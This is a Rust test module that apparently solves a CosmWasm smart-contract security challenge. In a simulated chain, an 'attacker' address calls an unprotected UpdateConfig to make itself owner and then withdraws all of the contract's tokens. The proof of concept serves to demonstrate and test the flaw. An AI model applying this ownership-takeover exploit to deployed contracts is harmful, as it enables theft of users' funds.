#[cfg(test)]

pub mod tests {
    use cosmwasm_std::{Addr, coin};
    use cw_multi_test::{App, Executor};

    use crate::{integration_tests::tests::{challenge_contract, mint_native, DENOM, query_balance_native}, msg::{InstantiateMsg, ExecuteMsg}};

    pub const ATTACKER : &str = "attacker";
    #[test]
    fn exploit(){
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked("owner"),
                &InstantiateMsg { owner: Addr::unchecked("owner").to_string() },
                &[],
                "Contract",
                None,
            )
            .unwrap();
            mint_native(&mut app, contract_addr.to_string(), DENOM.to_string(), 100);

            app.execute_contract(
                    Addr::unchecked(ATTACKER), 
                    contract_addr.clone(), 
                    &ExecuteMsg::Withdraw{destination: ATTACKER.to_string()}, 
                    &[]
            ).unwrap_err();

            app.execute_contract(
                    Addr::unchecked(ATTACKER), 
                    contract_addr.clone(), 
                    &ExecuteMsg::UpdateConfig { new_owner: ATTACKER.to_string() }, 
                    &[]
            ).unwrap();

            app.execute_contract(
                Addr::unchecked(ATTACKER), 
                contract_addr.clone(), 
                &ExecuteMsg::Withdraw{destination: ATTACKER.to_string()}, 
                &[]
            ).unwrap();
            
            let balance = query_balance_native(&mut app, &Addr::unchecked(ATTACKER), DENOM);
            assert_eq!(coin(100, DENOM), balance);
    }

}